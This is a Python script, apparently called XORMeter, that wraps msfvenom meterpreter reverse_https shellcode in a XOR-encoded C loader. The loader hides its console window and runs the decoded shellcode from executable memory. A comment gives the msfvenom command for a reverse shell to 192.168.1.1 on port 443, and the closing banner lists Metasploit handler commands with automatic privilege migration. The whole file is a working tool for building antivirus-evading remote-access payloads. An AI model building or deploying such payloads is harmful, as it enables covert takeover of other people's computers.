#!/usr/bin/python

#msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -f hex > Shellcode.txt

import binascii
import random
import sys

def opening_banner():
    ret ='''
__  _____  ____  __  __      _            
\ \/ / _ \|  _ \|  \/  | ___| |_ ___ _ __ 
 \  / | | | |_) | |\/| |/ _ \ __/ _ \ '__|
 /  \ |_| |  _ <| |  | |  __/ ||  __/ |   
/_/\_\___/|_| \_\_|  |_|\___|\__\___|_|
'''
    return ret

def finish_banner():
    ret ="""
[!] Payload Source code saved as: {0}  

[*] First compile the source code. 
[*] Then run the following on your Metasploit Host:

---------------------------------------------------
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443
set AutoRunScript post/windows/manage/priv_migrate
exploit -j
---------------------------------------------------

[*] Now you're ready to run the Payload on your target.
"""
    return ret

def format_output(bytes, xor_key):
    ret = """#define _WIN32_WINNT 0x0500
#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow) {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_MINIMIZE);
    ShowWindow(hWnd, SW_HIDE );
    """
    ret += bytes
    ret += """
    char c[sizeof b];
    for (int i = 0; i < sizeof b; i++) {
        c[i] = b[i] ^ """
    ret += "%s" % hex(xor_key)
    ret += """;
    } 
    void *exec = VirtualAlloc(0, sizeof c, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, c, sizeof c);
    ((void(*)())exec)();
}
"""
    return ret

def open_file(fname):
    o = open(fname, "r")
    ret = o.read()
    o.close()
    return ret

def write_file(fname, data):
    o = open(fname, "w")
    o.write(data)
    o.close()

def xor_code(scode, xor_key):
    ret = []
    for i in range(len(scode)):
        ret.append(ord(scode[i]) ^ xor_key)
    return ret

def to_byte_array(out_scode):
    byte_string = "char b[] = {"
    for i in range(len(out_scode)):
        byte_string += hex(out_scode[i])
        if i < len(out_scode)-1: 
            byte_string += ","
    byte_string += "};"
    return byte_string

def omg_halps():
    print("XOR your Shellcode with a random Xor-Key <Number between 1-255>\n")
    print("%s Shellcode.txt CompileMe.c\n" % sys.argv[0])

if __name__ == '__main__':
    print(opening_banner())
    if len(sys.argv) < 3:
        omg_halps()
        sys.exit(0)
    
    xor_key = random.randrange(1,255)
    hexbytes = open_file(sys.argv[1])
    xord_bytes = xor_code(binascii.unhexlify(hexbytes), xor_key)
    bytes = to_byte_array(xord_bytes)
    output_string = format_output(bytes, xor_key)
    write_file(sys.argv[2], output_string)
    closing = finish_banner()
    print(closing.format(sys.argv[2]))
    